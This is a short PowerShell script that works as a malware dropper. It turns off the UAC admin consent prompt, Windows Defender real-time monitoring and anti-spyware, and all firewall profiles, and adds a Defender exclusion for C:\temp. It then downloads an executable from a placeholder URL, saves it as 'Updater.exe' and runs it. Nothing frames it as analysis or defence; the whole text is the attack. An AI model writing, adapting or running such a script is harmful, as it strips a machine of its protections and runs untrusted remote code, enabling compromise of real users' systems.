# $url = "https://example.link/file.exe"
# $extension = "exe"
$output = "C:\temp\Updater.$extension"

# Disable Windows Defender AntiSpyware
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
Set-MpPreference -DisableRealtimeMonitoring $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
Add-MpPreference -ExclusionPath "C:\temp"
Start-Sleep -Seconds 5

# Download the file
Invoke-WebRequest -Uri $url -OutFile $output

# Run the downloaded file (adjust the command as needed)
Start-Process -FilePath $output -Wait


# Exit the script
exit